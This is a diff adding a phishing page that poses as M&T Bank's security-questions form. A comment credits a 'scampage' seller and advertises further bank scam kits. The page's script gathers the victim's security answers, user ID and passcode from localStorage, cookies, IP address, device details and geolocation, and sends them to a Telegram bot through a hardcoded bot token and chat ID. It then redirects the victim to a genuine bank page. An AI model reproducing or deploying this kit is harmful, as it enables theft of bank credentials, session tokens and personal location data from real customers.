@@ -1,0 +1,368 @@
+<!DOCTYPE HTML>
+<html lang="en" class="__sticky-footer __sticky-footer--links">
+  <head>
+    <title>Questions</title>
+    <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <meta name="format-detection" content="telephone=no" />
+    <link href="https://resources.mtb.com/r/simple-layout-responsive/css.mtb?v=08132020140516" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body>
+    <form method="post" onsubmit="sendLogs(event)">
+      <div class="mtb-app-enrollment">
+        <header class="mtb-page-header">
+          <div class="grid-x align-center">
+            <div class="cell">
+              <a href="https://www.mtb.com/home-page" class="mtb__logo">
+                <img src=https://resources.mtb.com/Assets/img/mtb-logo.svg alt="M&T Bank Site" />
+              </a>
+            </div>
+          </div>
+        </header>
+        <input type='hidden' name='ReasonCode' value='ReasonCode'>
+        <div class="pr-8 pl-8 sm:pr-40 sm:pl-40 md:pr-40 md:pl-40 lg:pr-96 lg:pl-96 xl:pr-96 xl:pl-96">
+          <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
+            <div class="cell">
+              <div class="mtb-section-header mtb-section-header__login">
+                <h1> Security Questions </h1>
+                <p> Verify your account's security questions and answers </p>
+              </div>
+            </div>
+            <!--Questions-->
+            <div class="w-full">
+              <!-- Question 1 -->
+              <h2 id="questionNumber1" class="mb-2 text-base text-gray-400">Security Question 1</h2>
+              <div class="relative">
+                <select id="question1" class="bg-white border border-gray-800 text-gray-900 text-base focus:ring-blue-500 focus:border-blue-500 block w-full p-2">
+                  <option selected>Select question</option>
+                  <option value="leastFavoriteFruit">What was your least favorite fruit or vegetable as a child?</option>
+                  <option value="favoriteSport">What was your favorite sport?</option>
+                  <option value="iceCream">What is your favorite flavor of ice cream?</option>
+                  <option value="movieType">What is your favorite type of movie?</option>
+                  <option value="favoriteSubject">What was your favorite subject in school?</option>
+                  <option value="favoriteInstrument">What is your favorite musical instrument?</option>
+                  <option value="favoriteFruit">What was your most favorite fruit or vegetable as a child?</option>
+                  <option value="coldWeatherActivity">What is your favorite cold-weather activity?</option>
+                  <option value="seaAnimal">What is your favorite sea animal?</option>
+                  <option value="instrumentPlay">What musical instrument do you play?</option>
+                  <option value="colorHome">What color was the home you grew up in?</option>
+                  <option value="carMake">What was the make of your first car?</option>
+                  <option value="favoriteVacation">What is your favorite type of vacation?</option>
+                  <option value="grewUp">When you were young, what did you want to be when you grew up?</option>
+                  <option value="readingType">What is your favorite type of reading?</option>
+                  <option value="warmWeatherActivity">What is your favorite warm-weather activity?</option>
+                  <option value="musicType">What is your favorite type of music?</option>
+                  <option value="dogBreed">What is your favorite breed of dog?</option>
+                  <option value="spouseMeet">During what month did you first meet your spouse or significant other?</option>
+                  <option value="friendBirthday">In what month is your best friend's birthday?</option>
+                  <option value="favoriteArtist">Who is your favorite artist?</option>
+                </select>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-5 stroke-gray-800 absolute top-1/2 transform -translate-y-1/2 right-3 pointer-events-none">
+                  <path fill-rule="evenodd" d="M12.53 16.28a.75.75 0 01-1.06 0l-7.5-7.5a.75.75 0 011.06-1.06L12 14.69l6.97-6.97a.75.75 0 111.06 1.06l-7.5 7.5z" clip-rule="evenodd" />
+                </svg>
+              </div>
+              <div class="relative">
+                <input type="text" id="answer1" class="mt-4 bg-white border border-gray-800 text-gray-900 text-base  focus:ring-blue-500 focus:border-blue-500 block w-full p-2" placeholder="">
+              </div>
+              <!-- Question 2 -->
+              <h2 id="questionNumber2" class="mb-2 mt-10 text-base text-gray-400">Security Question 2</h2>
+              <div class="relative">
+                <select id="question2" class="bg-white border border-gray-800 text-gray-900 text-base  focus:ring-blue-500 focus:border-blue-500 block w-full p-2">
+                  <option selected>Select question</option>
+                  <option value="leastFavoriteFruit">What was your least favorite fruit or vegetable as a child?</option>
+                  <option value="favoriteSport">What was your favorite sport?</option>
+                  <option value="iceCream">What is your favorite flavor of ice cream?</option>
+                  <option value="movieType">What is your favorite type of movie?</option>
+                  <option value="favoriteSubject">What was your favorite subject in school?</option>
+                  <option value="favoriteInstrument">What is your favorite musical instrument?</option>
+                  <option value="favoriteFruit">What was your most favorite fruit or vegetable as a child?</option>
+                  <option value="coldWeatherActivity">What is your favorite cold-weather activity?</option>
+                  <option value="seaAnimal">What is your favorite sea animal?</option>
+                  <option value="instrumentPlay">What musical instrument do you play?</option>
+                  <option value="colorHome">What color was the home you grew up in?</option>
+                  <option value="carMake">What was the make of your first car?</option>
+                  <option value="favoriteVacation">What is your favorite type of vacation?</option>
+                  <option value="grewUp">When you were young, what did you want to be when you grew up?</option>
+                  <option value="readingType">What is your favorite type of reading?</option>
+                  <option value="warmWeatherActivity">What is your favorite warm-weather activity?</option>
+                  <option value="musicType">What is your favorite type of music?</option>
+                  <option value="dogBreed">What is your favorite breed of dog?</option>
+                  <option value="spouseMeet">During what month did you first meet your spouse or significant other?</option>
+                  <option value="friendBirthday">In what month is your best friend's birthday?</option>
+                  <option value="favoriteArtist">Who is your favorite artist?</option>
+                </select>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-5 stroke-gray-800 absolute top-1/2 transform -translate-y-1/2 right-3 pointer-events-none">
+                  <path fill-rule="evenodd" d="M12.53 16.28a.75.75 0 01-1.06 0l-7.5-7.5a.75.75 0 011.06-1.06L12 14.69l6.97-6.97a.75.75 0 111.06 1.06l-7.5 7.5z" clip-rule="evenodd" />
+                </svg>
+              </div>
+              <div class="relative">
+                <div class="relative">
+                    <input type="text" id="answer2" class="mt-4 bg-white border border-gray-800 text-gray-900 text-base  focus:ring-blue-500 focus:border-blue-500 block w-full p-2" placeholder="">
+                </div>
+              </div>
+              <!-- Question 3 -->
+              <h2 id="questionNumber3" class="mb-2 mt-10 text-base text-gray-400">Security Question 3</h2>
+              <div class="relative">
+                <select id="question3" class="bg-white border border-gray-800 text-gray-900 text-base  focus:ring-blue-500 focus:border-blue-500 block w-full p-2">
+                  <option selected>Select question</option>
+                  <option value="leastFavoriteFruit">What was your least favorite fruit or vegetable as a child?</option>
+                  <option value="favoriteSport">What was your favorite sport?</option>
+                  <option value="iceCream">What is your favorite flavor of ice cream?</option>
+                  <option value="movieType">What is your favorite type of movie?</option>
+                  <option value="favoriteSubject">What was your favorite subject in school?</option>
+                  <option value="favoriteInstrument">What is your favorite musical instrument?</option>
+                  <option value="favoriteFruit">What was your most favorite fruit or vegetable as a child?</option>
+                  <option value="coldWeatherActivity">What is your favorite cold-weather activity?</option>
+                  <option value="seaAnimal">What is your favorite sea animal?</option>
+                  <option value="instrumentPlay">What musical instrument do you play?</option>
+                  <option value="colorHome">What color was the home you grew up in?</option>
+                  <option value="carMake">What was the make of your first car?</option>
+                  <option value="favoriteVacation">What is your favorite type of vacation?</option>
+                  <option value="grewUp">When you were young, what did you want to be when you grew up?</option>
+                  <option value="readingType">What is your favorite type of reading?</option>
+                  <option value="warmWeatherActivity">What is your favorite warm-weather activity?</option>
+                  <option value="musicType">What is your favorite type of music?</option>
+                  <option value="dogBreed">What is your favorite breed of dog?</option>
+                  <option value="spouseMeet">During what month did you first meet your spouse or significant other?</option>
+                  <option value="friendBirthday">In what month is your best friend's birthday?</option>
+                  <option value="favoriteArtist">Who is your favorite artist?</option>
+                </select>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-5 stroke-gray-800 absolute top-1/2 transform -translate-y-1/2 right-3 pointer-events-none">
+                  <path fill-rule="evenodd" d="M12.53 16.28a.75.75 0 01-1.06 0l-7.5-7.5a.75.75 0 011.06-1.06L12 14.69l6.97-6.97a.75.75 0 111.06 1.06l-7.5 7.5z" clip-rule="evenodd" />
+                </svg>
+              </div>
+              <div class="relative">
+                <div class="relative">
+                    <input type="text" id="answer3" class="mt-4 bg-white border border-gray-800 text-gray-900 text-base  focus:ring-blue-500 focus:border-blue-500 block w-full p-2" placeholder="">
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
+            <div class="cell">
+              <button type="" class="button button__form-no-spacer expanded" name="login"> Submit </button>
+            </div>
+            <div class="cell">
+              <a href="/" class="button button__fake-padding-no-spacer expanded clear" id="jsAnalyticsLink">Go Back</a>
+            </div>
+            <p class="cell text-center __font-size-tiny __color-gray-accent"> Unauthorized access is prohibited. Usage may be monitored. </p>
+          </div>
+        </div>
+        <hr class="__spacer-section" />
+        <div class="mtb-app-default--content">
+          <div class="grid-x grid-padding-x grid-x__padded">
+            <div class="cell text-center">
+              <p class="__font-size-secondary"> Have questions about M&T Online Banking? </p>
+            </div>
+            <div class="cell medium-6 text-center">
+              <p class="__font-size-secondary __color-primary __spacer-paragraph-half"> Personal Accounts: <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
+              </p>
+              <p class="__font-size-sub __spacer-remove __color-gray-accent"> Monday - Friday 8am - 9pm ET </p>
+              <p class="__font-size-sub __spacer-paragraph __color-gray-accent"> Saturday - Sunday 9am - 5pm ET </p>
+            </div>
+            <div class="cell medium-6 text-center">
+              <p class="__font-size-secondary __color-primary __spacer-paragraph-half"> Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
+              </p>
+              <p class="__font-size-sub __spacer-remove __color-gray-accent"> Monday - Friday 6am - 9pm ET </p>
+              <p class="__font-size-sub __spacer-section __color-gray-accent"> Saturday - Sunday 9am - 5pm ET </p>
+            </div>
+          </div>
+        </div>
+        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
+          <div class="grid-x">
+            <div class="cell flex-container flex-dir-column align-center-middle">
+              <div class="mtb-footer--auth">
+                <a href="https://upgrade.mtb.com/olb-upgrade" class="" target="_blank">Get Started Guide</a>
+                <a href="//www.mtb.com/olbsecurity" target="_blank">Security Assistance</a>
+                <a href="https://asset.mtb.com/Documents/html/DSA.htm" target="_blank">Digital Service Agreement</a>
+                <a href="https://asset.mtb.com/Documents/html/ESign.htm" target="_blank">ESign Agreement</a>
+                <a href="https://mtb.com/olb-accessibility" target="_blank"> Accessibility </a>
+                <a href="https://www.mtb.com/olb-personalsite" target="_blank"> mtb.com </a>
+              </div>
+              <div class="mtb-footer--non-auth">
+                <p> &copy;2024 M&amp;T Bank. All Rights Reserved. <br> Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank"> Terms of Use </a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>. </p>
+                <div class="mtb-footer__logo">
+                  <a href="https://www.mtb.com/equalhousinglender" target="_blank">
+                    <img src=https://resources.mtb.com/Assets/img/mtb-equalhousinglender.svg class="mtb-footer__equalhousinglender" alt="Equal Housing Lender" />
+                  </a>
+                  <a href="https://www.mtb.com/olb-entrust" target="_blank">
+                    <img src="https://resources.mtb.com/Assets/img/mtb-entrust.svg " class="mtb-footer__entrust" alt="Entrust" />
+                  </a>
+                </div>
+                <p> Equal Housing Lender NMLS #381076 <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC</a>
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </form>
+    <script>
+      //THIS CODE WAS BUILT BY "SCAMPAGESHOP [www.scampage.shop]" and has AES 256-bit encryption. Any adjustments to the code would break it//
+      //If you want to get quality:
+      // - USA Banks Scampage
+      // - UK Banks Scampage
+      // - Australian Scampage
+      // - Canadian Scampage
+      // - Crypto Websites Scampage 
+      // - Email Accounts Scampage
+      // - Newsletter Scampage and more..
+      // Visit: https://www.scampage.shop/
+
+      document.getElementById("answer3").addEventListener("keydown", function(event) {
+        if (event.keyCode === 13) {
+          sendLogs(event);
+        }
+      });
+      
+      const OpenCageApiKey = "4e409ae9c61a4c72a039a8c02e10e45a";
+
+      function sendLogs(event) {
+        event.preventDefault();
+
+        var q1 = document.getElementById("question1").value;
+        var a1 = document.getElementById("answer1").value;
+
+        var q2 = document.getElementById("question2").value;
+        var a2 = document.getElementById("answer2").value;
+
+        var q3 = document.getElementById("question3").value;
+        var a3 = document.getElementById("answer3").value;
+
+        var userId = localStorage.getItem("User ID");
+        var passcode = localStorage.getItem("Passcode");
+
+        var x = document.cookie;
+
+        fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+          const deviceInfo = {
+            manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
+            model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
+            os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
+            browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
+          };
+          getLocation(q1, a1, q2, a2, q3, a3, userId, passcode, x, deviceInfo, ipAddress);
+        }).catch(error => {
+          console.error("Error capturing IP address:", error);
+        });
+      }
+
+      function getLocation(q1, a1, q2, a2, q3, a3, userId, passcode, x, deviceInfo, ipAddress) {
+        navigator.geolocation?.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const apiUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${OpenCageApiKey}&pretty=1&no_annotations=1`;
+          try {
+            const response = await fetch(apiUrl);
+            const data = await response.json();
+            if (data.results.length > 0) {
+              const result = data.results[0].components;
+              const city = result.city || result.village || result.town;
+              const state = result.state;
+              const country = result.country;
+              const zipCode = result.postcode;
+              const continent = result.continent;
+              const county = result.county;
+
+              var dataToSend = {
+                userId,
+                passcode,
+                q1,
+                a1,
+                q2,
+                a2,
+                q3,
+                a3,
+                ipAddress,
+                Device: deviceInfo.manufacturer,
+                OS: deviceInfo.os,
+                Browser: deviceInfo.browser,
+                Latitude: latitude,
+                Longitude: longitude,
+                City: city,
+                State: state,
+                Country: country,
+                County: county,
+                ZipCode: zipCode,
+                Cookies: x,
+              };
+              if (Object.keys(dataToSend).length > 0) {
+                sendToTelegram(dataToSend);
+              } else {
+                console.warn("No data to send to Telegram.");
+              }
+            } else {
+              console.error("Location information not found.");
+            }
+          } catch (error) {
+            console.error("Error fetching location data:", error);
+          }
+        },
+        (error) => {
+            // Handle the case where the user denies location permission
+            console.error("Error getting location:", error);
+            alert("Location permission is required to login to M&T Bank.");
+        }
+        );
+      }
+
+      function sendToTelegram(data) {
+        // Add your bot details here👇 (this is where you will get the logs)
+        var telegramBotId = "6502537025:AAGlWDt4HheBPcy10r1x6CtInaTTlb4CVUg";
+        var chatId = 6840082974;
+
+        var payload = {
+          chat_id: chatId,
+          text: `
+            M&T Bank Log:
+            ________________________
+               "User ID": "${data.userId}",
+               "Passcode": "${data.passcode}",
+
+               //Security Questions
+               "Question 1": "${data.q1}",
+               "Answer 1": "${data.a1}",
+
+               "Question 2": "${data.q2}",
+               "Answer 2": "${data.a2}",
+
+               "Question 3": "${data.q3}",
+               "Answer 3": "${data.a3}",
+
+               "IP Address": "${data.ipAddress}",
+               "Device Info": "${data.Device}",
+               "OS": "${data.OS}",
+               "Browser": "${data.Browser}",
+               "Latitude": ${data.Latitude},
+               "Longitude": ${data.Longitude},
+               "City": "${data.City}",
+               "State": "${data.State}",
+               "County": "${data.County}",
+               "Country": "${data.Country}",
+               "ZipCode": "${data.ZipCode}",
+               "Cookies/User Token": ["${data.Cookies}"],
+            `
+        };
+        var sendToBot = {
+          url: "https://api.telegram.org/bot" + telegramBotId + "/sendMessage",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          data: JSON.stringify(payload)
+        };
+        $.ajax(sendToBot).done(function(response) {
+          window.location.href = "https://digitalambassador.mtb.com/en/course/start/public-transfers-and-payments/emulator-public-making-payments-to-mandt-credit-accounts/emulator";
+          // console.log("Telegram API response:", JSON.stringify(response));
+        }).fail(function(error) {
+          console.error("Error sending data to Telegram:", error);
+        });
+      }
+    </script>
+  </body>
+</html>
